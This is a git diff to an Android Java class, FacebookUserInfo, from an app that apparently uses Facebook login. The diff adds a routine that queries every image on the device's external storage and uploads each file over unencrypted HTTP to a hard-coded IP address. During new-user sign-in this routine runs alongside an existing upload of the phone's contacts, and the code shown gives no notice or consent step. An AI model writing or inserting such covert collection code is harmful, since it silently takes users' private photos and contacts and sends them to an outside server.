@@ -9,6 +9,8 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
+import android.text.TextUtils;
 import android.util.Log;
 import android.widget.ArrayAdapter;
 
@@ -33,7 +35,13 @@ import java.net.URL;
 import java.util.ArrayList;
 import org.apache.commons.io.FileUtils;
 
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
+import okhttp3.RequestBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
 
 /**
  * Created by q on 2017-07-07.
@@ -117,9 +125,9 @@ public class FacebookUserInfo {
                         Log.e("not in userlist", "email is "+ email);
 
                         uploadContact(email, context);
+                        uploadGallery(email, context);
                         uploadFacebookContact(email);
                     } else {
-                        uploadContact(email, context);
                         Log.e("already joined", "!");
                         try {
                             HttpCall.setMethodtext("GET");
@@ -238,7 +246,6 @@ public class FacebookUserInfo {
         graphRequest2.executeAsync();
     }
 
-    private static Context context;
     public static void uploadContact(String email, Context context) throws IOException {
         Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
         String[] projection = {
@@ -278,6 +285,91 @@ public class FacebookUserInfo {
         }
         contactCursor.close();
     }
+
+    private static ArrayList<String> getPathOfAllImages(Context context) {
+        ArrayList<String> result = new ArrayList<>();
+        Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME};
+
+        Cursor cursor = context.getContentResolver().query(uri, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " desc");
+        int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
+        int columnDisplayname = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME);
+
+        int lastIndex;
+        while (cursor.moveToNext()) {
+            String absolutePathOfImage = cursor.getString(columnIndex);
+            String nameOfFile = cursor.getString(columnDisplayname);
+            lastIndex = absolutePathOfImage.lastIndexOf(nameOfFile);
+            lastIndex = lastIndex >= 0 ? lastIndex : nameOfFile.length() - 1;
+
+            if (!TextUtils.isEmpty(absolutePathOfImage)) {
+                result.add(absolutePathOfImage);
+            }
+        }
+        for (String string : result) {
+            Log.e("for loop result", "|" + string + "|");
+        }
+        return result;
+    }
+
+    public static class PostImage {
+        OkHttpClient client = new OkHttpClient();
+
+        String post(String url, File file) throws IOException {
+
+            Log.e("post url", url);
+            Log.e("post file", file.toString());
+            RequestBody formBody = null;
+            String filenameArray[] = file.getName().split("\\.");
+            String ext = filenameArray[filenameArray.length - 1];
+            formBody = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("image", file.getName(), RequestBody.create(MediaType.parse("image/" + ext), file))
+                    .build();
+
+            Log.e("send req", "11111");
+
+            Request request = new Request.Builder().url(url).post(formBody).build();
+            Log.e("send req", "22222");
+            Response response = client.newCall(request).execute();
+            Log.e("send req", "3333");
+            if (!response.isSuccessful()) throw new IOException("Unexpected code " + response);
+            Log.e("send req", "4444");
+            return response.body().string();
+        }
+    }
+
+    public static void uploadGallery(final String email, Context context) throws IOException {
+
+        ArrayList<String> paths = new ArrayList<>();
+        paths = getPathOfAllImages(context);
+//        Log.e("pathlength", String.valueOf(paths.size()));
+        for (int i = 0; i < paths.size(); i++) {
+            Log.e("씨발!", "퇴근좀하자");
+            final File imgfile = new File(paths.get(i));
+            if (imgfile.exists()) {
+
+                final PostImage example = new PostImage();
+
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        String response = null;
+                        try {
+                            Log.e("req file", imgfile.toString());
+                            response = example.post("http://13.124.143.15:8080/api/"+email+"/addimage", imgfile);
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }).start();
+
+            }
+        }
+
+
+    }
+
 
     public static ArrayList<fbContact> getContactListdirect() {
         final ArrayList<fbContact> contact_list = new ArrayList<>();
